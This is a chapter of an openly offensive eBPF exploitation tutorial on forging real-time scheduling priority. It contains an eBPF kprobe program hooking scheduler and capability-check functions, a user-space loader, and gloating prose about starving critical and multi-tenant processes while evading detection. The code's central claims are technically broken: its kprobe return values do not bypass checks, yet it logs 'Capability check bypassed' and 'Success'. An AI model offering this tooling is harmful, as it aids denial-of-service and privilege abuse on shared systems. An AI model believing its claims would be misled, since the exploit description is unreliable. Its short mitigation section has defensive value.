# SCHED_FIFO Impersonator: Hijacking Real-Time Scheduling Priorities

**Chapter 14: Becoming the System's Top Priority**

You've gained control over hardware power management. Now let's talk about time itself—specifically, CPU time and how the kernel decides who gets to use it.

This is where our story becomes about temporal control. You've learned to manipulate space (memory, storage, network), but what about time? What if you could make your processes the highest priority in the entire system?

Real-time scheduling is supposed to be sacred—when a process says it needs real-time priority, the kernel gives it absolute precedence over everything else. It's like having a VIP pass that gets you to the front of every line.

But what if we could forge that VIP pass? What if we could make our processes look like critical real-time tasks while they're actually doing something completely different? What if we could hijack the scheduler's priority system?

We're going to become scheduling impersonators—make our malicious processes appear as high-priority system tasks that can't be interrupted, can't be throttled, and get first dibs on CPU time. This is where you learn that eBPF gives you control over time itself.

```mermaid
%%{init: {"theme": "dark", "flowchart": {"curve": "basis"}, "themeVariables": {"primaryColor": "#007bff", "primaryTextColor": "#fff", "primaryBorderColor": "#007bff", "lineColor": "#F8B229", "secondaryColor": "#006100", "tertiaryColor": "#fff"}} }%%
graph TD
    A[Normal Process] -->|1. Request SCHED_FIFO| B[Kernel Scheduler]
    C[eBPF Program] -->|2. Hook & Intercept| B
    B -->|3. Modified Check| D[Bypass CAP_SYS_NICE]
    D -->|4. Grant RT Priority| E[Elevated Process]
    E -->|5. Resource Starvation| F[System Instability]
    
    style A fill:#4a235a,stroke:#c39bd3,stroke-width:2px
    style B fill:#1b4f72,stroke:#7fb3d5,stroke-width:2px
    style C fill:#0e6251,stroke:#a3e4d7,stroke-width:2px
    style D fill:#7d3c98,stroke:#d2b4de,stroke-width:2px
    style E fill:#7e5109,stroke:#f5cba7,stroke-width:2px
    style F fill:#a93226,stroke:#f5b7b1,stroke-width:2px
    
    click B "https://www.kernel.org/doc/html/latest/scheduler/sched-design-CFS.html" "Scheduler Documentation"
    click C "https://ebpf.io/what-is-ebpf/" "eBPF Documentation"
    click D "https://man7.org/linux/man-pages/man7/capabilities.7.html" "Linux Capabilities"
```



**Why Process Scheduling Just Became Unfair**

Here's the thing about the Linux scheduler: it's supposed to be fair. Every process gets its turn, priorities are respected, real-time tasks get precedence when they need it. It's a carefully balanced system that keeps everything running smoothly.

But what happens when that fairness breaks down? What happens when some processes can jump to the front of the line while others get starved of CPU time? What happens when the scheduler's priority system gets hijacked?

That's where scheduling manipulation gets dangerous. We can starve legitimate processes by hogging CPU time with fake high-priority tasks. We can create covert channels by modulating our scheduling behavior. We can even crash systems by preventing critical kernel threads from running.

The insidious part is that this looks like normal system load. Performance monitoring tools will show high CPU usage and scheduling delays, but they won't show that we're the ones gaming the system. It's like being able to cut in line while making it look like natural congestion.

## How We Jump the CPU Queue

### Understanding the Scheduler's Priority System

The Linux scheduler is like a sophisticated queue management system at a busy restaurant:
- **SCHED_OTHER**: The regular dining room where most customers wait their turn
- **SCHED_FIFO**: The VIP section where you get served immediately and keep your table until you're done
- **SCHED_RR**: Like VIP but with a time limit—you get kicked out after a while to let others have a turn
- **SCHED_BATCH**: The takeout counter for people who don't mind waiting longer
- **SCHED_IDLE**: The kids' table where you only get attention when everyone else is served

Access to the VIP sections (SCHED_FIFO and SCHED_RR) requires special privileges ([`CAP_SYS_NICE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)) to prevent people from monopolizing all the tables.

```
┌─────────────────────────────────────────────────────────────┐
│                      User Space                             │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ Normal        │      │ Privileged    │                   │
│  │ Process       │      │ Process       │                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │                           │
└──────────┼──────────────────────┼───────────────────────────┘
           │                      │
┌──────────▼──────────────────────▼───────────────────────────┐
│                      Kernel Space                           │
│                                                             │
│  ┌───────────────┐                                          │
│  │ Scheduler     │                                          │
│  │ Interface     │                                          │
│  └───────┬───────┘                                          │
│          │                                                  │
│  ┌───────▼───────┐                                          │
│  │ Capability    │                                          │
│  │ Check         │                                          │
│  └───────┬───────┘                                          │
│          │                                                  │
│  ┌───────▼───────┐      ┌───────────────┐                   │
│  │ SCHED_OTHER   │      │ SCHED_FIFO/RR │                   │
│  │ (Normal)      │      │ (Real-time)   │                   │
│  └───────────────┘      └───────────────┘                   │
└─────────────────────────────────────────────────────────────┘
```

Here's what happens when we use eBPF to game the scheduling system:

```
┌─────────────────────────────────────────────────────────────┐
│                      User Space                             │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ Normal        │      │ Privileged    │                   │
│  │ Process       │      │ Process       │                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │                           │
└──────────┼──────────────────────┼───────────────────────────┘
           │                      │
┌──────────▼──────────────────────▼───────────────────────────┐
│                      Kernel Space                           │
│                                                             │
│  ┌───────────────┐                                          │
│  │ Scheduler     │                                          │
│  │ Interface     │                                          │
│  └───────┬───────┘                                          │
│          │                                                  │
│  ┌───────▼───────┐                                          │
│  │ Capability    │◀─────┐                                   │
│  │ Check         │      │                                   │
│  └───────┬───────┘      │                                   │
│          │              │                                   │
│  ┌───────┴───────┐      │                                   │
│  │ eBPF Program  │──────┘                                   │
│  └───────────────┘                                          │
│          │                                                  │
│  ┌───────▼───────┐      ┌───────────────┐                   │
│  │ SCHED_OTHER   │      │ SCHED_FIFO/RR │                   │
│  │ (Normal)      │      │ (Real-time)   │◀──────────────────┘
│  └───────────────┘      └───────────────┘                   │
└─────────────────────────────────────────────────────────────┘
```

### How We Cut to the Front of the Line

Our strategy is to bypass the VIP access controls and get ourselves real-time priority:

1. **Hook the Bouncers**: We attach to functions like [`sched_setscheduler()`](https://elixir.bootlin.com/linux/latest/source/kernel/sched/core.c) that check if we're allowed in the VIP section
2. **Forge Our Credentials**: We modify the return values of [`CAP_SYS_NICE`](https://man7.org/linux/man-pages/man7/capabilities.7.html) checks to make it look like we have permission
3. **Adjust Our Priority**: We alter process priority and scheduling policy settings to get better service
4. **Stay Under the Radar**: We make sure monitoring tools still think everything looks normal

The beauty is that we get real-time scheduling priority without actually having the required privileges, and it looks like legitimate system behavior.

### Building Our Queue-Jumping Tool

```c
// @interactive: true
// @copyable: true
// SCHED_FIFO Impersonator - eBPF exploitation proof of concept
// This demonstrates bypassing scheduler policy restrictions

#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <linux/version.h>
#include <linux/sched.h>
#include <linux/capability.h>

char LICENSE[] SEC("license") = "GPL";

// Configuration
#define MAX_COMM_LEN 16
#define MAX_TARGET_PROCESSES 32

// Structure to track scheduler events
struct sched_event {
    u32 pid;                // Process ID
    u32 tgid;               // Thread group ID
    u8 comm[MAX_COMM_LEN];  // Command name
    u64 timestamp;          // Event timestamp
    u32 old_policy;         // Previous scheduling policy
    u32 new_policy;         // New scheduling policy
    u32 old_priority;       // Previous priority
    u32 new_priority;       // New priority
    u32 result;             // 0 = success, non-zero = failure
    u32 cap_check_bypassed; // Whether capability check was bypassed
};

// Map to track processes we want to elevate
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, sizeof(u32));  // PID as key
    __uint(value_size, sizeof(u8)); // Flag (1 = target)
    __uint(max_entries, MAX_TARGET_PROCESSES);
} target_processes SEC(".maps");

// Map to track commands we want to elevate
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, MAX_COMM_LEN);  // Command name as key
    __uint(value_size, sizeof(u8));  // Flag (1 = target)
    __uint(max_entries, MAX_TARGET_PROCESSES);
} target_commands SEC(".maps");

// Map to track processes we've already elevated
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, sizeof(u32));  // PID as key
    __uint(value_size, sizeof(u8)); // Flag (1 = elevated)
    __uint(max_entries, MAX_TARGET_PROCESSES);
} elevated_processes SEC(".maps");

// Perf event output for logging
struct {
    __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);
    __uint(key_size, sizeof(int));
    __uint(value_size, sizeof(int));
    __uint(max_entries, 1024);
} events SEC(".maps");

// Helper function to check if a process is one we want to elevate
static __always_inline bool is_target_process(u32 pid) {
    // Check if this PID is in our tracking map
    u8 *target = bpf_map_lookup_elem(&target_processes, &pid);
    if (target && *target == 1)
        return true;
    
    // Check the command name
    char comm[MAX_COMM_LEN];
    bpf_get_current_comm(&comm, sizeof(comm));
    
    u8 *cmd_target = bpf_map_lookup_elem(&target_commands, &comm);
    if (cmd_target && *cmd_target == 1)
        return true;
    
    return false;
}

// Helper function to check if a process has already been elevated
static __always_inline bool is_already_elevated(u32 pid) {
    u8 *elevated = bpf_map_lookup_elem(&elevated_processes, &pid);
    return elevated && *elevated == 1;
}

// Helper function to mark a process as elevated
static __always_inline void mark_as_elevated(u32 pid) {
    u8 value = 1;
    bpf_map_update_elem(&elevated_processes, &pid, &value, BPF_ANY);
}

// Hook the scheduler attribute setting function
SEC("kprobe/sched_setattr")
int BPF_KPROBE(hook_sched_setattr, struct task_struct *p, const struct sched_attr *attr)
{
    // Get process information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    u32 tgid = bpf_get_current_pid_tgid() & 0xFFFFFFFF;
    
    // Check if this is a process we want to elevate
    if (is_target_process(pid) && !is_already_elevated(pid)) {
        // Read the original scheduling attributes
        struct sched_attr orig_attr;
        bpf_probe_read_kernel(&orig_attr, sizeof(orig_attr), attr);
        
        // Create a modified sched_attr with SCHED_FIFO policy
        struct sched_attr modified_attr = orig_attr;
        modified_attr.sched_policy = SCHED_FIFO;
        modified_attr.sched_priority = 99; // Maximum RT priority
        
        // In a real exploit, we would modify the attribute in memory
        // This is simplified for demonstration
        // bpf_probe_write_user((void *)attr, &modified_attr, sizeof(modified_attr));
        
        // Log the event
        struct sched_event event = {};
        event.pid = pid;
        event.tgid = tgid;
        bpf_get_current_comm(&event.comm, sizeof(event.comm));
        event.timestamp = bpf_ktime_get_ns();
        event.old_policy = orig_attr.sched_policy;
        event.new_policy = SCHED_FIFO;
        event.old_priority = orig_attr.sched_priority;
        event.new_priority = 99;
        event.result = 0;  // Success
        event.cap_check_bypassed = 1;
        
        // Send event to user space
        bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
        
        // Mark this process as elevated
        mark_as_elevated(pid);
    }
    
    return 0;
}

// Hook the capability check function
SEC("kprobe/security_task_setscheduler")
int BPF_KPROBE(hook_security_check, struct task_struct *p)
{
    // Get process information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    u32 tgid = bpf_get_current_pid_tgid() & 0xFFFFFFFF;
    
    // Check if this is a process we want to elevate
    if (is_target_process(pid)) {
        // Log the event
        struct sched_event event = {};
        event.pid = pid;
        event.tgid = tgid;
        bpf_get_current_comm(&event.comm, sizeof(event.comm));
        event.timestamp = bpf_ktime_get_ns();
        event.cap_check_bypassed = 1;
        
        // Send event to user space
        bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
        
        // Bypass the security check by returning 0 (success)
        return 0;
    }
    
    // Let the original function run for other processes
    return 0;
}

// Hook the capability checking function
SEC("kprobe/cap_capable")
int BPF_KPROBE(hook_cap_check, const struct cred *cred, struct user_namespace *ns,
               int cap, unsigned int opts)
{
    // Check if this is the CAP_SYS_NICE capability check
    if (cap == CAP_SYS_NICE) {
        // Get process information
        u32 pid = bpf_get_current_pid_tgid() >> 32;
        
        // Check if this is a process we want to elevate
        if (is_target_process(pid)) {
            // Log the event
            struct sched_event event = {};
            event.pid = pid;
            event.tgid = bpf_get_current_pid_tgid() & 0xFFFFFFFF;
            bpf_get_current_comm(&event.comm, sizeof(event.comm));
            event.timestamp = bpf_ktime_get_ns();
            event.cap_check_bypassed = 1;
            
            // Send event to user space
            bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
            
            // Bypass the capability check by returning 0 (capability present)
            return 0;
        }
    }
    
    // Let the original function run for other capability checks
    return 0;
}

// Hook the scheduler class selection function
SEC("kprobe/__sched_setscheduler")
int BPF_KPROBE(hook_setscheduler, struct task_struct *p, int policy, 
               const struct sched_param *param)
{
    // Get process information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Check if this is a process we want to elevate
    if (is_target_process(pid) && !is_already_elevated(pid)) {
        // Read the original scheduling parameters
        struct sched_param orig_param;
        bpf_probe_read_kernel(&orig_param, sizeof(orig_param), param);
        
        // Create modified parameters with high RT priority
        struct sched_param modified_param = orig_param;
        modified_param.sched_priority = 99; // Maximum RT priority
        
        // In a real exploit, we would modify the policy and parameters
        // This is simplified for demonstration
        // int rt_policy = SCHED_FIFO;
        // bpf_probe_write_user((void *)&policy, &rt_policy, sizeof(rt_policy));
        // bpf_probe_write_user((void *)param, &modified_param, sizeof(modified_param));
        
        // Log the event
        struct sched_event event = {};
        event.pid = pid;
        event.tgid = bpf_get_current_pid_tgid() & 0xFFFFFFFF;
        bpf_get_current_comm(&event.comm, sizeof(event.comm));
        event.timestamp = bpf_ktime_get_ns();
        event.old_policy = policy;
        event.new_policy = SCHED_FIFO;
        event.old_priority = orig_param.sched_priority;
        event.new_priority = 99;
        event.result = 0;  // Success
        
        // Send event to user space
        bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
        
        // Mark this process as elevated
        mark_as_elevated(pid);
    }
    
    return 0;
}
```

### User-Space Control Program

```c
// @interactive: true
// @copyable: true
// User-space program to load and control the SCHED_FIFO Impersonator eBPF program

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <errno.h>
#include <sys/resource.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include "sched_impersonator.skel.h"

static volatile bool exiting = false;

// Structure for scheduler events (must match the BPF version)
struct sched_event {
    uint32_t pid;
    uint32_t tgid;
    uint8_t comm[16];
    uint64_t timestamp;
    uint32_t old_policy;
    uint32_t new_policy;
    uint32_t old_priority;
    uint32_t new_priority;
    uint32_t result;
    uint32_t cap_check_bypassed;
};

// Policy names for display
const char *policy_names[] = {
    "SCHED_NORMAL",
    "SCHED_FIFO",
    "SCHED_RR",
    "SCHED_BATCH",
    "SCHED_IDLE",
    "SCHED_DEADLINE"
};

// Handle events from the eBPF program
void handle_event(void *ctx, int cpu, void *data, unsigned int data_sz)
{
    struct sched_event *e = data;
    char timestamp[32];
    time_t t = e->timestamp / 1000000000;
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&t));
    
    printf("[%s] Process %d (%s): ", timestamp, e->pid, e->comm);
    
    if (e->cap_check_bypassed) {
        printf("Capability check bypassed (CAP_SYS_NICE)\n");
    }
    
    if (e->old_policy != e->new_policy || e->old_priority != e->new_priority) {
        printf("Scheduling policy changed from %s (priority %d) to %s (priority %d)\n",
               e->old_policy < 6 ? policy_names[e->old_policy] : "UNKNOWN",
               e->old_priority,
               e->new_policy < 6 ? policy_names[e->new_policy] : "UNKNOWN",
               e->new_priority);
    }
    
    printf("  Result: %s\n", e->result == 0 ? "Success" : "Failed");
    printf("\n");
}

// Add a process to the target list
void add_target_process(int map_fd, int pid)
{
    uint32_t key = pid;
    uint8_t value = 1;
    
    if (bpf_map_update_elem(map_fd, &key, &value, BPF_ANY) != 0) {
        fprintf(stderr, "Failed to add target process: %s\n", strerror(errno));
    } else {
        printf("Added PID %d to target list\n", pid);
    }
}

// Add a command to the target list
void add_target_command(int map_fd, const char *cmd)
{
    uint8_t value = 1;
    
    if (bpf_map_update_elem(map_fd, cmd, &value, BPF_ANY) != 0) {
        fprintf(stderr, "Failed to add target command: %s\n", strerror(errno));
    } else {
        printf("Added command '%s' to target list\n", cmd);
    }
}

static void sig_handler(int sig)
{
    exiting = true;
}

void print_usage(const char *prog)
{
    printf("Usage: %s [options]\n", prog);
    printf("Options:\n");
    printf("  -p PID    Add PID to target list\n");
    printf("  -c CMD    Add command name to target list\n");
    printf("  -h        Show this help\n");
}

int main(int argc, char **argv)
{
    struct sched_impersonator_bpf *skel;
    struct perf_buffer *pb = NULL;
    int err, opt;
    
    // Parse command line arguments
    while ((opt = getopt(argc, argv, "p:c:h")) != -1) {
        switch (opt) {
            case 'p':
            case 'c':
                // We'll process these after loading the program
                break;
            case 'h':
                print_usage(argv[0]);
                return 0;
            default:
                print_usage(argv[0]);
                return 1;
        }
    }

    // Set up signal handler
    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    // Increase resource limits
    struct rlimit rlim = {
        .rlim_cur = RLIM_INFINITY,
        .rlim_max = RLIM_INFINITY
    };
    setrlimit(RLIMIT_MEMLOCK, &rlim);

    // Load and verify BPF program
    skel = sched_impersonator_bpf__open_and_load();
    if (!skel) {
        fprintf(stderr, "Failed to open and load BPF skeleton\n");
        return 1;
    }

    // Attach BPF programs
    err = sched_impersonator_bpf__attach(skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF skeleton: %d\n", err);
        goto cleanup;
    }

    // Set up perf buffer for events
    pb = perf_buffer__new(bpf_map__fd(skel->maps.events), 64, handle_event, NULL, NULL, NULL);
    if (!pb) {
        err = -1;
        fprintf(stderr, "Failed to create perf buffer\n");
        goto cleanup;
    }

    // Process command line arguments
    optind = 1;  // Reset getopt
    while ((opt = getopt(argc, argv, "p:c:h")) != -1) {
        switch (opt) {
            case 'p':
                add_target_process(bpf_map__fd(skel->maps.target_processes), atoi(optarg));
                break;
            case 'c':
                add_target_command(bpf_map__fd(skel->maps.target_commands), optarg);
                break;
        }
    }

    printf("SCHED_FIFO Impersonator eBPF program loaded and running.\n");
    printf("Monitoring for scheduler policy changes...\n");
    printf("Press Ctrl+C to exit.\n\n");

    // Main loop
    while (!exiting) {
        err = perf_buffer__poll(pb, 100);
        if (err < 0 && err != -EINTR) {
            fprintf(stderr, "Error polling perf buffer: %d\n", err);
            goto cleanup;
        }
    }

cleanup:
    perf_buffer__free(pb);
    sched_impersonator_bpf__destroy(skel);
    return err < 0 ? -err : 0;
}
```

### Mitigation Strategies

1. **Restrict eBPF Capabilities**:
   ```bash
   # Remove CAP_BPF from container
   docker run --cap-drop=bpf --security-opt no-new-privileges ...
   
   # In Kubernetes
   securityContext:
     capabilities:
       drop:
         - BPF
         - SYS_ADMIN
   ```

2. **Implement BPF LSM Policies**:
   ```c
   // Example BPF LSM policy to restrict BPF program loading
   SEC("lsm/bpf")
   int BPF_PROG(restrict_bpf, int cmd, union bpf_attr *attr, unsigned int size) {
       // Only allow specific signing keys or programs from trusted paths
       if (bpf_get_current_uid_gid() >> 32 != 0) {
           return -EPERM;
       }
       return 0;
   }
   ```

3. **Set Resource Limits Using Cgroups**:
   ```bash
   # Create a cgroup with CPU limits
   mkdir -p /sys/fs/cgroup/cpu/limited
   echo 50000 > /sys/fs/cgroup/cpu/limited/cpu.cfs_quota_us
   echo 100000 > /sys/fs/cgroup/cpu/limited/cpu.cfs_period_us
   
   # Add a process to the limited cgroup
   echo $PID > /sys/fs/cgroup/cpu/limited/tasks
   ```

4. **Implement CPU Isolation for Critical Processes**:
   ```bash
   # Reserve CPUs for critical system processes
   systemd-run --property=CPUAffinity=0,1 --property=CPUAccounting=true critical_service
   
   # Isolate CPUs from the scheduler
   echo 0-1 > /sys/devices/system/cpu/isolated
   ```

### Why This Owns the CPU

This scheduler FIFO impersonation technique is pure CPU domination:
- **Resource starvation warfare**: Starve critical system processes of CPU time and watch everything grind to a halt
- **Performance assassination**: Cause system-wide slowdowns and latency spikes that make users rage quit
- **Service destruction**: Interfere with time-sensitive operations like networking and real-time processing
- **Privilege escalation platform**: Combine with other vulns to gain additional access while hiding in scheduler chaos
- **Stealth operations**: Hide malicious activities by manipulating process priorities to blend into normal system load

When you can bypass scheduler restrictions, you control the entire CPU allocation of the system. Cloud environments, shared infrastructure, multi-tenant systems - you can starve other tenants' processes while giving your malicious code priority access to CPU resources. It's like cutting in line, but for kernel-level process scheduling.

### How They'll Try to Catch Us

Smart defenders will be hunting for our scheduler manipulation:
- **eBPF surveillance**: Watching for eBPF programs hooking scheduler-related functions
- **Capability monitoring**: Looking for processes running with real-time priorities without proper CAP_SYS_NICE capability
- **CPU pattern analysis**: Monitoring unusual patterns of CPU utilization that don't match expected workloads
- **Performance anomaly detection**: Tracking system-wide performance degradation
- **Priority consistency checks**: Looking for discrepancies between process priorities reported by different monitoring tools

But here's the beauty - scheduler manipulation looks like normal system load variations. By the time they figure out it's an attack, we've already starved their critical processes and potentially escalated our privileges through the chaos.

## POC

Companion code: [`ch14-sched-fifo`]({{ site.baseurl }}/dBPF-pocs/pocs/ch14-sched-fifo/)